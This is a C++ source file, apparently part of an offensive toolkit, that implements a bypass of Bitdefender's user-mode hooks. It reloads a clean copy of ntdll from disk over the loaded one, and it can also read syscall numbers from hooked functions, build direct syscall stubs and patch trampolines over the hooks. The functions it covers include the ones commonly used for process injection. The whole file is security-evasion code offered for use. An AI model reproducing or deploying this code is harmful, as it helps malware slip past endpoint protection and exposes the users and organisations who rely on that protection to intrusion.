// pretty horrible bitdefender bypass (i forgot if this one even works)

#include "bitdefender.h"
#include <winternl.h>
#include <fstream>
#include <sstream>
#include <algorithm>
#include <string>
#include <locale>
#include <codecvt>

const std::vector<std::string> NTDLL_FUNCTIONS = {
    "NtAllocateVirtualMemory",
    "NtProtectVirtualMemory",
    "NtWriteVirtualMemory",
    "NtReadVirtualMemory",
    "NtCreateThreadEx",
    "NtQueueApcThread",
    "NtOpenProcess",
    "NtOpenThread",
    "NtSuspendProcess",
    "NtResumeProcess",
    "NtGetContextThread",
    "NtSetContextThread",
    "NtCreateSection",
    "NtMapViewOfSection",
    "NtQueryInformationProcess",
    "NtSetInformationProcess"
};

const std::vector<BYTE> STUB_TEMPLATE = {
    0x4C, 0x8B, 0xD1,                           // mov r10, rcx
    0xB8, 0x00, 0x00, 0x00, 0x00,               // mov eax, SSN
    0x0F, 0x05,                                 // syscall
    0xC3                                        // ret
};

std::vector<bitdefenderbypass::moduleinfo> bitdefenderbypass::getmodules() {
    std::vector<moduleinfo> modules;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, GetCurrentProcessId());
    if (snapshot != INVALID_HANDLE_VALUE) {
        MODULEENTRY32 modEntry;
        modEntry.dwSize = sizeof(MODULEENTRY32);
        if (Module32First(snapshot, &modEntry)) {
            do {
                moduleinfo info;
                info.base = modEntry.modBaseAddr;
                info.size = modEntry.modBaseSize;
                info.name = std::wstring_convert<std::codecvt_utf8<wchar_t>>().to_bytes(modEntry.szModule);
                info.path = std::wstring_convert<std::codecvt_utf8<wchar_t>>().to_bytes(modEntry.szExePath);
                modules.push_back(info);
            } while (Module32Next(snapshot, &modEntry));
        }
        CloseHandle(snapshot);
    }
    return modules;
}

LPVOID bitdefenderbypass::findecall(LPVOID modulebase, const std::string& functionname) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)modulebase;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)modulebase + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return nullptr;
    if (nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == 0)
        return nullptr;
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)modulebase +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* functions = (DWORD*)((BYTE*)modulebase + exports->AddressOfFunctions);
    DWORD* names = (DWORD*)((BYTE*)modulebase + exports->AddressOfNames);
    WORD* ordinals = (WORD*)((BYTE*)modulebase + exports->AddressOfNameOrdinals);
    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        char* name = (char*)((BYTE*)modulebase + names[i]);
        if (functionname == name) {
            LPVOID function = (LPVOID)((BYTE*)modulebase + functions[ordinals[i]]);
            if ((DWORD)function >= (DWORD)exports &&
                (DWORD)function < (DWORD)exports + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size) {
                char forward_name[256];
                strcpy_s(forward_name, (char*)function);
                char* dot = strchr(forward_name, '.');
                if (dot) {
                    *dot = '\0';
                    std::string dll_name = forward_name;
                    std::string func_name = dot + 1;
                    auto modules = getmodules();
                    for (const auto& mod : modules) {
                        if (_stricmp(mod.name.c_str(), dll_name.c_str()) == 0) {
                            return findecall(mod.base, func_name);
                        }
                    }
                }
                return nullptr;
            }

            return function;
        }
    }
    return nullptr;
}

std::vector<BYTE> bitdefenderbypass::readmemory(LPVOID address, SIZE_T size) {
    std::vector<BYTE> buffer(size);
    MEMORY_BASIC_INFORMATION mbi;
    if (VirtualQuery(address, &mbi, sizeof(mbi))) {
        if (mbi.Protect & (PAGE_READONLY | PAGE_READWRITE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE)) {
            SIZE_T read;
            if (ReadProcessMemory(GetCurrentProcess(), address, buffer.data(), size, &read)) {
                return buffer;
            }
        }
    }
    return std::vector<BYTE>();
}

bool bitdefenderbypass::writememory(LPVOID address, std::vector<BYTE> data) {
    DWORD old_protect;
    SIZE_T region_size = data.size();
    LPVOID aligned_address = (LPVOID)((DWORD_PTR)address & ~0xFFF);
    region_size += (DWORD_PTR)address - (DWORD_PTR)aligned_address;
    region_size = (region_size + 0xFFF) & ~0xFFF;
    if (VirtualProtect(aligned_address, region_size, PAGE_EXECUTE_READWRITE, &old_protect)) {
        SIZE_T written;
        bool result = WriteProcessMemory(GetCurrentProcess(), address, data.data(), data.size(), &written);
        DWORD temp;
        VirtualProtect(aligned_address, region_size, old_protect, &temp);
        FlushInstructionCache(GetCurrentProcess(), address, data.size());
        return result;
    }
    return false;
}

bool bitdefenderbypass::is_function_hooked(LPVOID address) {
    std::vector<BYTE> func_bytes = readmemory(address, 32);
    if (func_bytes.size() < 32) return false;
    if (func_bytes[0] == 0xE9) return true;
    if (func_bytes[0] == 0x48 && func_bytes[1] == 0xB8) {
        if (func_bytes[10] == 0xFF && func_bytes[11] == 0xE0) return true;
    }
    if (func_bytes[0] == 0x68 && func_bytes[5] == 0xC3) return true;
    return false;
}

DWORD bitdefenderbypass::calculate_syscall_id(LPVOID function_address) {
    std::vector<BYTE> func_bytes = readmemory(function_address, 32);
    if (func_bytes.size() < 32) return 0;
    for (size_t i = 0; i < func_bytes.size() - 4; i++) {
        if (func_bytes[i] == 0xB8) { 
            DWORD ssn = *(DWORD*)(func_bytes.data() + i + 1);
            return ssn;
        }
    }
    return 0;
}

std::vector<BYTE> bitdefenderbypass::read_file_to_memory(const std::string& path) {
    std::ifstream file(path, std::ios::binary | std::ios::ate);
    if (!file.is_open()) return {};
    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);
    std::vector<BYTE> buffer(size);
    if (file.read((char*)buffer.data(), size)) {
        return buffer;
    }
    return {};
}

bool bitdefenderbypass::restore_ntdll_from_disk() {
    auto modules = getmodules();
    std::string ntdll_path;
    LPVOID ntdll_base = nullptr;
    for (const auto& mod : modules) {
        if (_stricmp(mod.name.c_str(), "ntdll.dll") == 0) {
            ntdll_path = mod.path;
            ntdll_base = mod.base;
            break;
        }
    }
    if (ntdll_path.empty() || !ntdll_base) return false;
    std::vector<BYTE> clean_ntdll = read_file_to_memory(ntdll_path);
    if (clean_ntdll.empty()) return false;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)clean_ntdll.data();
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(clean_ntdll.data() + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return false;
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)section[i].Name, ".text") == 0) {
            LPVOID text_rva = (LPVOID)((DWORD_PTR)ntdll_base + section[i].VirtualAddress);
            std::vector<BYTE> clean_text(clean_ntdll.data() + section[i].PointerToRawData,
                clean_ntdll.data() + section[i].PointerToRawData + section[i].SizeOfRawData);
            return writememory(text_rva, clean_text);
        }
    }
    return false;
}

bool bitdefenderbypass::build_dynamic_syscall_stubs() {
    auto modules = getmodules();
    LPVOID ntdll_base = nullptr;
    for (const auto& mod : modules) {
        if (_stricmp(mod.name.c_str(), "ntdll.dll") == 0) {
            ntdll_base = mod.base;
            break;
        }
    }
    if (!ntdll_base) return false;
    LPVOID stub_memory = VirtualAlloc(nullptr, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!stub_memory) return false;
    DWORD_PTR current_stub = (DWORD_PTR)stub_memory;
    for (const auto& func_name : NTDLL_FUNCTIONS) {
        LPVOID func_address = findecall(ntdll_base, func_name);
        if (!func_address) continue;
        if (is_function_hooked(func_address)) {
            DWORD ssn = calculate_syscall_id(func_address);
            if (ssn == 0) continue;
            std::vector<BYTE> stub = STUB_TEMPLATE;
            *(DWORD*)(stub.data() + 4) = ssn; 
            memcpy((LPVOID)current_stub, stub.data(), stub.size());
            syscall_entry entry;
            entry.name = func_name;
            entry.id = ssn;
            entry.original_address = func_address;
            entry.hooked_address = nullptr; 
            entry.syscall_stub = (LPVOID)current_stub;
            syscall_table.push_back(entry);
            current_stub += stub.size();
            current_stub = (current_stub + 15) & ~15;
        }
    }
    DWORD old_protect;
    VirtualProtect(stub_memory, 4096, PAGE_EXECUTE_READ, &old_protect);
    return !syscall_table.empty();
}

bool bitdefenderbypass::patch_ntdll_hooks() {
    auto modules = getmodules();
    LPVOID ntdll_base = nullptr;
    for (const auto& mod : modules) {
        if (_stricmp(mod.name.c_str(), "ntdll.dll") == 0) {
            ntdll_base = mod.base;
            break;
        }
    }
    if (!ntdll_base) return false;
    bool success = false;
    for (const auto& entry : syscall_table) {
        if (entry.syscall_stub) {
            std::vector<BYTE> trampoline = {
                0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, stub_address
                0xFF, 0xE0                                                  // jmp rax
            };
            *(DWORD_PTR*)(trampoline.data() + 2) = (DWORD_PTR)entry.syscall_stub;
            if (writememory(entry.original_address, trampoline)) {
                success = true;
            }
        }
    }

    return success;
}

bool bitdefenderbypass::unhook_ntdll() {
    if (restore_ntdll_from_disk()) {
        return true;
    }
    if (build_dynamic_syscall_stubs()) {
        if (patch_ntdll_hooks()) {
            return true;
        }
    }
    return false;
}
bool bitdefenderbypass::bypass() {
    return unhook_ntdll();
}